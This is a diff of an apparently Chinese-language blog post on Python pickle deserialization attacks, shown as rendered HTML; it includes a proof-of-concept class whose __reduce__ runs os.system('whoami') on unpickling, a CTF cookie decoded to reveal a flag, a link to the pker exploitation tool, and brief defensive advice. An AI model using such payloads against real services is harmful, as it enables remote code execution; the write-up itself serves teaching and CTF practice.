@@ -475,7 +475,7 @@ BUILD指令执行时，因为没有__setstate__方法，所以就执行update，
 <p>示例：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name=<span class="string">&quot;test&quot;</span></span>):</span><br><span class="line">        self.name=name</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">a = People()</span><br><span class="line">c = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">pickle.loads(c)</span><br></pre></td></tr></table></figure>
 <p>输出<br>
-b&quot;\x80\x04\x95=\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04eval\x94\x93\x94\x8c!<strong>import</strong>(‘os’).system(‘whoami’)\x94\x85\x94==<strong>R</strong>==\x94.&quot;<br>
+b&quot;\x80\x04\x95=\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04eval\x94\x93\x94\x8c!<strong>import</strong>(‘os’).system(‘whoami’)\x94\x85\x94<strong>R</strong>\x94.&quot;<br>
 pan\27104</p>
 <h2 id="pickle的常用攻击方式">pickle的常用攻击方式</h2>
 <ol>
@@ -532,6 +532,10 @@ base64编码后，抓下购买flag的包，修改其中的cookie发送</p>
 <p>将返回的cookie反序列化：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(base64.b64decode(<span class="string">b&#x27;gAN9cQAoWAUAAABtb25leXEBTSgjWAcAAABoaXN0b3J5cQJdcQNYKwAAAGZsYWd7MjM1NzllOTMtNjBmNi00YWIyLWIyOGMtYjIxMTg1NDhjYTlmfQpxBGFYEAAAAGFudGlfdGFtcGVyX2htYWNxBVggAAAANzQ1ZmVkMjk1MmIzM2YwOGVhYjhiZWU4ZGI2NWE3ZTlxBnUu&#x27;</span>)))</span><br></pre></td></tr></table></figure>
 <p>输出{‘money’: 9000, ‘history’: [‘flag{23579e93-60f6-4ab2-b28c-b2118548ca9f}\n’], ‘anti_tamper_hmac’: ‘745fed2952b33f08eab8bee8db65a7e9’}</p>
+<hr>
+<p>pickle反序列化有一个专门的利用工具pker</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/EddieIvan01/pker">https://github.com/EddieIvan01/pker</a></p>
+<p>由于我自己也还没玩明白就暂时不作介绍了</p>
 <h2 id="Python-反序列化漏洞如何防御"><strong>Python 反序列化漏洞如何防御</strong></h2>
 <p>(1) 不要再不守信任的通道中传递 pcikle 序列化对象<br>
 (2) 在传递序列化对象前请进行签名或者加密，防止篡改和重播<br>
